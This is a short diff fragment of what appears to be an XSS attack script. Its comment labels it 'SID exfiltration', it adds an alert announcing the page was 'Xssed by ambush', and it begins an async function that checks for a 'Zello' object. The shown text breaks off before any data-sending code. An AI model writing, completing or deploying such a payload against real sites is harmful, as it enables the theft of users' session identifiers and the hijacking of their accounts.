@@ -1,5 +1,5 @@
 //SID exfiltration
-
+alert('Xssed by ambush on ',document.domain);
 (async function(){
     try{
         if(typeof Zello==='undefined'){
